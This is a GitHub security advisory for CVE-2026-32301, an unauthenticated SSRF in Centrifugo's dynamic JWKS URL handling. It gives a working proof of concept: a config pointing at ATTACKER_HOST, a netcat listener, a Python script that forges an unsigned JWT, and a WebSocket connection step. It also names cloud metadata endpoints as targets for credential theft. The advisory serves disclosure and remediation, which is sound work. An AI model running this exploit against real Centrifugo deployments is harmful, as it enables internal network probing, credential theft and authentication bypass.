# [C] Centrifugo: SSRF via unverified JWT claims interpolated into dynamic JWKS endpoint URL

## Summary
Severity: Critical
Advisory: GHSA-j77h-rr39-c552
CVE: CVE-2026-32301
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-j77h-rr39-c552
Type: github-advisory

## Affected
- Go: `github.com/centrifugal/centrifugo/v6` — affected >=0 <6.7.0
- Go: `github.com/centrifugal/centrifugo` — affected >=0
- Go: `github.com/centrifugal/centrifugo/v3` — affected >=0
- Go: `github.com/centrifugal/centrifugo/v4` — affected >=0
- Go: `github.com/centrifugal/centrifugo/v5` — affected >=0

## Details
### Summary
Centrifugo is vulnerable to Server-Side Request Forgery (SSRF) when configured with a dynamic JWKS endpoint URL using template variables (e.g. `{{tenant}}`). An unauthenticated attacker can craft a JWT with a malicious `iss` or `aud` claim value that gets interpolated into the JWKS fetch URL **before the token signature is verified**, causing Centrifugo to make an outbound HTTP request to an attacker-controlled destination.

### Details
In `internal/jwtverify/token_verifier_jwt.go`, the functions `VerifyConnectToken` and `VerifySubscribeToken` follow this flawed order of operations:
1. Token is parsed without verification: `jwt.ParseNoVerify([]byte(t))`
2. Claims are decoded from the unverified token
3. `validateClaims()` runs — extracting named regex capture groups from 
   `issuer_regex`/`audience_regex` into `tokenVars` map using attacker-controlled 
   `iss`/`aud` claim values
4. `verifySignatureByJWK(token, tokenVars)` is called — passing attacker-controlled 
   `tokenVars` to the JWKS manager
5. In `internal/jwks/manager.go`, `fetchKey()` interpolates `tokenVars` directly 
   into the JWKS URL:
   `jwkURL := m.url.ExecuteString(tokenVars)`
6. Centrifugo makes an HTTP GET request to the attacker-controlled URL

Suppressed the security linter on this line with an incorrect comment:
`//nolint:gosec // URL is from server configuration, not user input.`
The URL is NOT purely from server configuration — it is partially constructed from unverified user-supplied JWT claims.

Signature verification happens too late — after the SSRF has already fired.

### PoC
**Required config** (`config.json`):
```json
{
  "client": {
    "token": {
      "jwks_public_endpoint": "http://ATTACKER_HOST:8888/{{tenant}}/.well-known/jwks.json",
      "issuer_regex": "^(?P[a-zA-Z0-9_-]+)\\.auth\\.example\\.com$"
    }
  },
  "http_api": { "key": "test-api-key" }
}
```

**Step 1** — Start listener on attacker machine:
```
nc -lvnp 8888
```

**Step 2** — Generate malicious unsigned JWT:
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b'{"alg":"RS256","kid":"test-kid","typ":"JWT"}'
payload = b'{"sub":"attacker","iss":"evil-tenant.auth.example.com","exp":9999999999}'
token   = f"{b64url(header)}.{b64url(payload)}.fakesig"
print(token)
```

**Step 3** — Connect to Centrifugo WebSocket with the malicious token:
```python
import websocket, json
ws = websocket.create_connection("ws://TARGET:8000/connection/websocket")
ws.send(json.dumps({"id": 1, "connect": {"token": ""}}))
print(ws.recv())
```

**Step 4** — Observe incoming HTTP request on attacker listener:
```
GET /evil-tenant/.well-known/jwks.json HTTP/1.1
Host: ATTACKER_HOST:8888
User-Agent: Go-http-client/1.1
```

Malicious token being crafted with suppress_origin=True bypassing the 403, and the token sent to Centrifugo:
![1](https://github.com/user-attachments/assets/6fd5d5b8-f47a-4899-94db-931f52504808)

Centrifugo Server Log:
![2](https://github.com/user-attachments/assets/2e802648-8dc9-40d7-ac9e-f5f2ca19acad)

netcat terminal:
![3](https://github.com/user-attachments/assets/854cfb19-ed0c-44e2-977a-efe2f9b6c50a)

### Impact
- **Unauthenticated SSRF** — No valid credentials required
- Attacker can probe and access internal network services not exposed externally
- On cloud deployments: access to metadata endpoints (AWS: `169.254.169.254`, GCP: `metadata.google.internal`) to steal IAM credentials
- Attacker can serve a malicious JWKS response containing their own public key, causing Centrifugo to accept attacker-signed tokens as legitimate — leading to **full authentication bypass**
- Exploitation requires `jwks_public_endpoint` to contain `{{...}}` template variables combined with `issuer_regex` or `audience_regex` — a configuration pattern explicitly documented and promoted by Centrifugo
 
### Suggested Fix

**1. Verify signature BEFORE extracting tokenVars (critical fix):**
In `token_verifier_jwt.go`, swap the order of operations:
```go
// CURRENT (vulnerable) order:
// 1. ParseNoVerify
// 2. validateClaims() → populates tokenVars from unverified claims
// 3. verifySignature(token, tokenVars)  ← too late

// FIXED order:
// 1. ParseNoVerify
// 2. verifySignature(token)  ← verify first with empty/nil tokenVars
// 3. validateClaims() → only now extract tokenVars from verified claims
// 4. If JWKS needed, re-verify with tokenVars using verified kid only
```

**2. Fix the incorrect nolint comment in `manager.go`:**
Remove `//nolint:gosec // URL is from server configuration, not user input` The URL IS partially constructed from user input via JWT claims.

**3. Alternative mitigation:**
Restrict template variables to only the `kid` header field (which is not claim data) rather than allowing arbitrary claim values to influence the JWKS URL.
```

## References
- https://github.com/centrifugal/centrifugo/security/advisories/GHSA-j77h-rr39-c552
- https://nvd.nist.gov/vuln/detail/CVE-2026-32301
- https://github.com/centrifugal/centrifugo
- https://pkg.go.dev/vuln/GO-2026-4702
